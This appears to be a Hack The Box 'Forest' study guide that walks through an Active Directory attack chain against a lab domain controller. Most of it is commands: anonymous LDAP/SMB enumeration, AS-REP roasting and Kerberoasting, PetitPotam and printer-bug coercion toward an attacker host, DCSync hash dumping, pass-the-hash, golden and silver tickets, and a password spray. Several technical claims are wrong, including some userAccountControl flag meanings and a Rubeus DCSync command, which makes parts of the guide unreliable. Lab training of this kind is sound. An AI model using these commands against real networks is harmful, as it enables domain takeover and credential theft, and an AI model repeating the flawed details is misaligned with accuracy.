# HTB Forest - Active Directory Exploitation Learning Path

## Target: 10.129.95.210 (FOREST.htb.local)
**Domain:** htb.local | **DC:** FOREST | **OS:** Windows Server 2016

---

## 🎯 Learning Objectives

By completing this path, you will understand:
1. **Unconstrained Delegation** - Why it's dangerous on a DC
2. **Authentication Coercion** - PetitPotam / Printer Bug / Spooler abuse
3. **TGT Theft & DCSync** - From coerced auth to domain compromise
4. **LDAP Enumeration** - Anonymous binds, user/SPN enumeration
5. **Kerberos Attacks** - Kerberoasting, AS-REP Roasting (concepts)
6. **Post-Exploitation** - DCSync, Golden Tickets, persistence

---

## 📋 Phase 1: Recon & Enumeration (Manual First)

### 1.1 Verify Connectivity & Hosts Entry
```bash
# Add to /etc/hosts for easier access
echo "10.129.95.210 forest.htb.local FOREST" | sudo tee -a /etc/hosts

# Test connectivity
ping -c 3 10.129.95.210
```

### 1.2 Full Port Scan (Save Output)
```bash
mkdir -p ~/sessions/forest/{loot,sploit,notes}
cd ~/sessions/forest

# Comprehensive scan
sudo nmap -p- -sCV -T4 10.129.95.210 -oA loot/nmap-full

# UDP scan for DNS/LDAP (optional)
sudo nmap -sU -p 53,88,389,464 --top-ports 20 10.129.95.210 -oA loot/nmap-udp
```

### 1.3 LDAP Anonymous Enumeration (KEY SKILL)
```bash
# 1. Domain info via LDAP
ldapsearch -x -H ldap://10.129.95.210 -b "DC=htb,DC=local" -s base

# 2. All users (critical for targeting)
ldapsearch -x -H ldap://10.129.95.210 -b "DC=htb,DC=local" "(objectClass=user)" \
  cn sAMAccountName userPrincipalName description userAccountControl \
  lastLogon pwdLastSet badPwdCount servicePrincipalName \
  -o ldif-wrap=no > loot/ldap-users.ldif

# 3. SPN enumeration (Kerberoasting targets)
ldapsearch -x -H ldap://10.129.95.210 -b "DC=htb,DC=local" "(servicePrincipalName=*)" \
  cn sAMAccountName servicePrincipalName userAccountControl \
  -o ldif-wrap=no > loot/ldap-spns.ldif

# 4. Computer accounts (look for unconstrained delegation)
ldapsearch -x -H ldap://10.129.95.210 -b "DC=htb,DC=local" "(objectClass=computer)" \
  cn sAMAccountName userAccountControl servicePrincipalName \
  -o ldif-wrap=no > loot/ldap-computers.ldif

# 5. Group membership (find Service Accounts group)
ldapsearch -x -H ldap://10.129.95.210 -b "DC=htb,DC=local" "(cn=Service Accounts)" \
  member -o ldif-wrap=no
```

**🔍 What to analyze:**
- `userAccountControl: 532480` = TRUSTED_FOR_DELEGATION (unconstrained) + other flags
- `userAccountControl: 4096` = TRUSTED_FOR_DELEGATION only (constrained)
- `userAccountControl: 4194304` = DONT_REQ_PREAUTH (AS-REP roastable)
- Service accounts with SPNs = Kerberoasting targets


### 1.4 NetExec (nxc) Quick Enum
```bash
# SMB shares (null session)
nxc smb 10.129.95.210 -u '' -p '' --shares

# User enum via SMB
nxc smb 10.129.95.210 -u '' -p '' --users

# LDAP enum via nxc
nxc ldap 10.129.95.210 -u '' -p '' --users
nxc ldap 10.129.95.210 -u '' -p '' --groups
nxc ldap 10.129.95.210 -u '' -p '' --computers
```

### 1.5 Kerberos Enum (No Creds)
```bash
# Get TGT for domain (tests Kerberos connectivity)
# GetNPUsers for AS-REP roasting
impacket-GetNPUsers htb.local/ -dc-ip 10.129.95.210 -no-pass -usersfile /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -format hashcat -outputfile loot/asrep-roast.txt

# GetUserSPNs for Kerberoasting (machine accounts only here)
impacket-GetUserSPNs htb.local/ -dc-ip 10.129.95.210 -no-pass -request -machine-only -outputfile loot/kerberoast-machine.txt
```

---

## 📋 Phase 2: Understanding the Critical Vulnerability

### 2.1 Unconstrained Delegation on DC - THE CONCEPT

**What is it?**
- When a computer/user has `TRUSTED_FOR_DELEGATION` (UAC flag 524288 / 0x80000)
- It can request Kerberos tickets **on behalf of any user** to **any service**
- On a DC: The DC stores **every user's TGT** in memory when they authenticate

**Why is it catastrophic on a DC?**
1. Any admin authenticating to the DC → their TGT is cached in LSASS
2. If you compromise the DC (or coerce it to authenticate to you), you get **all TGTs**
3. With a Domain Admin TGT → **DCSync** → dump entire NTDS.dit

**Check the flag:**
```bash
# From LDAP output, look for FOREST$:
# userAccountControl: 532480 = 524288 (TRUSTED_FOR_DELEGATION) + 8192 (TRUSTED_TO_AUTH_FOR_DELEGATION)
# 524288 = 0x80000 = TRUSTED_FOR_DELEGATION (unconstrained)
```

### 2.2 The Attack Chain Overview

```
┌─────────────────────────────────────────────────────────────────┐
│  ATTACK CHAIN: Unconstrained Delegation on DC                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. COERCE          DC (FOREST$) authenticates TO attacker      │
│     (PetitPotam /   via SMB/MS-RPRN/MS-EFSR                    │
│      Printer Bug)                                              │
│           │                                                     │
│           ▼                                                     │
│  2. CAPTURE        Attacker receives NTLM/Kerberos auth         │
│     (NTLM relay /  If Kerberos: get TGT for FOREST$             │
│      Kerberos)                                                 │
│           │                                                     │
│           ▼                                                     │
│  3. TGT THEFT      Use Rubeus/mimikatz to extract TGT           │
│     (Rubeus        From attacker's machine or relay             │
│      monitor)                                                  │
│           │                                                     │
│           ▼                                                     │
│  4. DCSYNC         Use DC's TGT to request NTDS.dit replication │
│     (secretsdump / Get domain admin hashes                      │
│      mimikatz)                                                 │
│           │                                                     │
│           ▼                                                     │
│  5. DOMAIN ADMIN   Pass-the-hash / Golden Ticket / Silver Ticket│
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 📋 Phase 3: Exploitation - Coercion Attacks

### 3.1 Option A: PetitPotam (EFSRPC - CVE-2021-36942/36946)

**Prerequisites:** EFSRPC enabled (default on Server 2016), SMB signing not required for relay (but we'll use Kerberos)

```bash
# Check if PetitPotam works
python3 ~/tools/PetitPotam/PetitPotam.py -d htb.local -u '' -p '' 10.129.95.210 <ATTACKER_IP>

# Or use the coercer tool (more reliable)
python3 ~/tools/coercer/coercer.py coerce -t 10.129.95.210 -l <ATTACKER_IP> -u '' -p '' --method efsrpc
```

### 3.2 Option B: Printer Bug (MS-RPRN - Spooler)

```bash
# Using SpoolSample / Rubeus monitor
# First, start Rubeus to monitor for TGTs
Rubeus.exe monitor /interval:5 /filteruser:FOREST$

# In another terminal, trigger printer bug
# Using SpoolSample.exe (C#) or Python implementation
python3 ~/tools/SpoolSample/SpoolSample.py 10.129.95.210 <ATTACKER_IP>
```

### 3.3 Option C: NTLM Relay to LDAPS (If Kerberos fails)

```bash
# ntlmrelayx.py to relay to LDAPS and add delegation rights
# But Forest requires SMB signing, so this may not work directly
# Focus on Kerberos coercion (PetitPotam/Printer)
```

---

## 📋 Phase 4: TGT Extraction & DCSync

### 4.1 Using Rubeus (Windows) - Preferred for Kerberos

```powershell
# On attacker Windows machine (or via evil-winrm if you get shell)
# 1. Monitor for incoming TGTs
Rubeus.exe monitor /interval:5 /filteruser:FOREST$

# 2. After coercion, extract TGT
Rubeus.exe ptt /ticket:<base64_ticket>

# 3. DCSync with DC's TGT
Rubeus.exe dcsync /user:htb\Administrator /domain:htb.local /dc:FOREST.htb.local
```

### 4.2 Using Impacket (Linux) - secretsdump.py

```bash
# If you have NTLM hash of DC (from relay)
 secretsdump.py -just-dc-user Administrator -just-dc-ntlm "htb.local/FOREST\$@10.129.95.210" -no-pass

# Or with Kerberos TGT (if you extracted it)
# Convert kirbi to ccache
ticketConverter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
secretsdump.py -k -no-pass htb.local/FOREST\$@FOREST.htb.local -just-dc-user Administrator
```

### 4.3 Using Mimikatz (if on Windows)

```powershell
# sekurlsa::tickets /export
# lsadump::dcsync /domain:htb.local /user:Administrator
```

---

## 📋 Phase 5: Post-Exploitation & Persistence

### 5.1 With Domain Admin Hash (from DCSync)
```bash
# Pass-the-Hash to any machine
evil-winrm -i 10.129.95.210 -u Administrator -H <NTLM_HASH>

# Or get shell on DC
psexec.py htb.local/Administrator@10.129.95.210 -hashes :<NTLM_HASH>
```

### 5.2 Golden Ticket (Long-term Persistence)
```bash
# Get krbtgt hash from DCSync output
# Create Golden Ticket
ticketer.py -nthash <krbtgt_hash> -domain-sid <domain_sid> -domain htb.local -user Administrator
# or
mimikatz: kerberos::golden /user:Administrator /domain:htb.local /sid:<domain_sid> /krbtgt:<krbtgt_hash> /ptt
```

### 5.3 Silver Ticket (Service-specific)
```bash
# For specific service (e.g., CIFS, HOST, HTTP)
mimikatz: kerberos::golden /user:Administrator /domain:htb.local /sid:<domain_sid> /target:FOREST.htb.local /service:CIFS /rc4:<service_account_hash> /ptt
```

---

## 📋 Phase 6: Alternative Paths (If Main Chain Fails)

### 6.1 Service Account: svc-alfresco
```bash
# Password spray (check lockout policy first!)
nxc smb 10.129.95.210 -u svc-alfresco -p 'Password1' 'Welcome1' 'Summer2024' 'Winter2024' 'Spring2024' 'Fall2024' 'Password123' 'Welcome123' 'Passw0rd' 'P@ssw0rd' 'Admin123' 'Test123' 'alfresco' 'Alfresco1' 'Alfresco123'

# If compromised, check for:
# - ACLs allowing delegation modification
# - Certificate templates (Certifried/ESC1-ESC13)
# - Group memberships
```

### 6.2 Certificate Attacks (Certipy)
```bash
# Anonymous cert enumeration
certipy find -u '' -p '' -dc-ip 10.129.95.210 -vulnerable -stdout -json -output loot/certipy-find

# Look for ESC1-ESC13 vulnerabilities
# If svc-alfresco compromised, auth with it:
certipy find -u svc-alfresco -p '<password>' -dc-ip 10.129.95.210 -vulnerable
```

### 6.3 RBCD (Resource-Based Constrained Delegation)
```bash
# If you compromise a machine account or service account
# Check if you can write msDS-AllowedToActOnBehalfOfOtherIdentity
# Then impersonate admin to that service
```

---

## 🛠️ Required Tools Checklist

```bash
# Install/verify these tools:
# ─────────────────────────────────────────
# Impacket (Python)
pipx install impacket

# NetExec (nxc)
pipx install netexec

# Certipy
pipx install certipy-ad

# Rubeus (Windows) - compile from source
# git clone https://github.com/GhostPack/Rubeus
# Build in Visual Studio

# Coercer
git clone https://github.com/p0dalirius/Coercer ~/tools/coercer

# PetitPotam
git clone https://github.com/topotam/PetitPotam ~/tools/PetitPotam

# SpoolSample
git clone https://github.com/leechristensen/SpoolSample ~/tools/SpoolSample

# BloodHound (for graph analysis)
# docker run -d --name bloodhound -p 7474:7474 -p 7687:7687 ...
```

---

## 📚 Key Concepts to Master

| Concept | Why It Matters | Forest Demo |
|---------|---------------|-------------|
| **Unconstrained Delegation** | DC caches all TGTs | FOREST$ has it ✓ |
| **Constrained Delegation** | Limited to specific SPNs | EXCH01$ has constrained |
| **RBCD** | Modern delegation, easier to abuse | Check svc-alfresco ACLs |
| **Kerberos TGT/TGS** | Ticket structure | Extract via Rubeus |
| **DCSync** | DRsuAPI replication abuse | Get Admin hash |
| **PetitPotam/Printer** | Coerce DC auth | Primary exploit path |
| **Golden/Silver Ticket** | Forge Kerberos tickets | Persistence |

---

## 📝 Notes Template

Create `~/sessions/forest/notes/attack.log`:

```markdown
# Forest Attack Log

## Target
- IP: 10.129.95.210
- Domain: htb.local
- DC: FOREST.htb.local

## Recon Findings
- [ ] Port scan complete
- [ ] LDAP anonymous bind works
- [ ] Users enumerated: [list]
- [ ] SPNs enumerated: [list]
- [ ] FOREST$ has unconstrained delegation: YES/NO
- [ ] svc-alfresco exists: YES/NO

## Exploitation Attempts
| Vector | Tool | Result | Notes |
|--------|------|--------|-------|
| PetitPotam | coercer | | |
| Printer Bug | SpoolSample | | |
| NTLM Relay | ntlmrelayx | | (SMB signing?) |
| Kerberoasting | GetUserSPNs | | Machine only |
| AS-REP Roast | GetNPUsers | | None vulnerable |
| Password Spray | nxc | | svc-alfresco |

## Credentials Obtained
| Account | Hash/Ticket | Source | Privilege |
|---------|-------------|--------|-----------|
| FOREST$ | TGT | Coercion | DC |
| Administrator | NTLM | DCSync | Domain Admin |

## Flags
- user.txt: 
- root.txt: 
```

---

## 🎓 Learning Exercises (Do These!)

### Exercise 1: Manual LDAP Analysis
Parse `loot/ldap-computers.ldif` and identify:
- Which computers have `userAccountControl: 532480`?
- What does each bit mean? (Decode 532480)
- Why is unconstrained on DC worse than on member server?

### Exercise 2: Kerberos Traffic Analysis
```bash
# Capture Kerberos traffic during coercion
sudo tcpdump -i eth0 -w loot/kerberos-coercion.pcap port 88
# Analyze in Wireshark: kerberos.msg_type
```

### Exercise 3: BloodHound Ingestion
```bash
# Run bloodhound-python (if you get creds)
bloodhound-python -u 'svc-alfresco' -p '<pass>' -ns 10.129.95.210 -d htb.local -c all -zip

# Analyze: Find shortest path from svc-alfresco to Domain Admins
# Check: "Unconstrained Delegation" edge from FOREST
```

### Exercise 4: Write Your Own Coercion Script
Study the PetitPotam/Coercer code and understand:
- EFSRPC `EfsRpcOpenFileRaw` call
- How the UNC path `\\attacker\share` triggers auth
- Why Kerberos delegation allows TGT capture

---

## 🏁 Success Criteria

You've mastered Forest when you can:
- [ ] Explain unconstrained delegation to a colleague
- [ ] Perform the full chain: Coerce → TGT → DCSync → DA
- [ ] Identify the same misconfig in BloodHound
- [ ] Write a detection rule for PetitPotam/Printer coercion
- [ ] Explain mitigations: "Protected Users" group, "Account is sensitive and cannot be delegated", delegation monitoring

---

## 📖 Further Reading

- [Harmj0y - A Guide to Delegation](https://www.harmj0y.net/blog/activedirectory/a-guide-to-delegation/)
- [Will Schroeder - Unconstrained Delegation](https://posts.specterops.io/understanding-and-exploiting-unconstrained-delegation-in-active-directory)
- [PetitPotam Original](https://github.com/topotam/PetitPotam)
- [Coercer Tool](https://github.com/p0dalirius/Coercer)
- [Rubeus Documentation](https://github.com/GhostPack/Rubeus)
- [Certipy ESC1-ESC13](https://github.com/ly4k/Certipy/wiki/ESC1)
- [MITRE ATT&CK - T1550.003](https://attack.mitre.org/techniques/T1550/003/)

---

## ⚠️ Legal Notice

**Only run these against authorized targets (HTB labs, your own AD lab, client environments with written permission).** Unauthorized access to computer systems is illegal.

---

*Happy hunting! The Forest machine is one of the best teachers for AD delegation attacks. Master this, and you'll understand the #1 AD misconfiguration that leads to full domain compromise.*